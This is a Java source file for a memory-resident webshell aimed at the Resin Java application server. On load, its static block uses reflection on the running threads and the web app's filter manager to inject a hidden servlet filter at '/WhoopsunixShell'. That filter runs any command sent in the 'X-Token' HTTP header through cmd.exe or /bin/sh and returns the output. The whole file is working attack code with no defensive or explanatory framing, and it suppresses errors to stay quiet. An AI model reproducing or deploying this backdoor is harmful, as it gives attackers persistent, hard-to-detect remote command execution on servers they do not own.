package org.example.resin.memshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

/**
 * @author Whoopsunix
 */
public class ResinFilterExecMS implements Filter {
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";
    private static String HEADER = "X-Token";


    static {
        try {
            ResinFilterExecMS resinFilterExecMS = new ResinFilterExecMS();

            Thread[] threads = (Thread[]) getFieldValue(Thread.currentThread().getThreadGroup(), "threads");

            for (int i = 0; i < threads.length; i++) {
                try {
                    Class cls = threads[i].currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
                    Object contextRequest = cls.getMethod("getContextRequest").invoke(null);
                    Object webapp = contextRequest.getClass().getMethod("getWebApp").invoke(contextRequest);
                    if (webapp == null)
                        continue;

                    if (isInject(webapp, resinFilterExecMS)) {
                        break;
                    }

                    inject(webapp, resinFilterExecMS);

                } catch (Exception e) {

                }
            }
        } catch (Exception e) {
        }
    }

    public static boolean isInject(Object webapp, Object object) {
        try {

            String NAME = (String) getFieldValue(object, "NAME");
            Object _filterManager = getFieldValue(webapp, "_filterManager");
            HashMap _filters = (HashMap) getFieldValue(_filterManager, "_filters");
            if (_filters.containsKey(NAME)) {
                return true;
            }
            HashMap _urlPatterns = (HashMap) getFieldValue(_filterManager, "_urlPatterns");
            if (_urlPatterns.containsKey(NAME)) {
                return true;
            }
            HashMap _instances = (HashMap) getFieldValue(_filterManager, "_instances");
            if (_instances.containsKey(NAME)) {
                return true;
            }

        } catch (Exception e) {
            
        }

        return false;
    }

    public static void inject(Object webapp, Object object) {
        try {
            String NAME = (String) getFieldValue(object, "NAME");
            String PATTERN = (String) getFieldValue(object, "PATTERN");

            Object filterMapping = Class.forName("com.caucho.server.dispatch.FilterMapping").newInstance();
            invokeMethod(filterMapping, "setFilterClass", new Class[]{String.class}, new Object[]{object.getClass().getName()});
            invokeMethod(filterMapping, "setFilterName", new Class[]{String.class}, new Object[]{NAME});

            Object urlPattern = invokeMethod(filterMapping, "createUrlPattern", new Class[]{}, new Object[]{});
            invokeMethod(urlPattern, "addText", new Class[]{String.class}, new Object[]{PATTERN});
            invokeMethod(webapp, "addFilterMapping", new Class[]{Class.forName("com.caucho.server.dispatch.FilterMapping")}, new Object[]{filterMapping});

        } catch (Exception e) {
            
        }
    }

    public void init(FilterConfig filterConfig) throws ServletException {

    }

    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(HEADER);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    public void destroy() {
    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(Class<?> clazz, String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) {
        try {
            Method method;
            try {
                method = obj.getClass().getDeclaredMethod(methodName, argsClass);
            } catch (NoSuchMethodException e) {
                method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
            }
            method.setAccessible(true);
            Object object = method.invoke(obj, args);
            return object;
        } catch (Exception e) {
            
        }
        return null;
    }
}
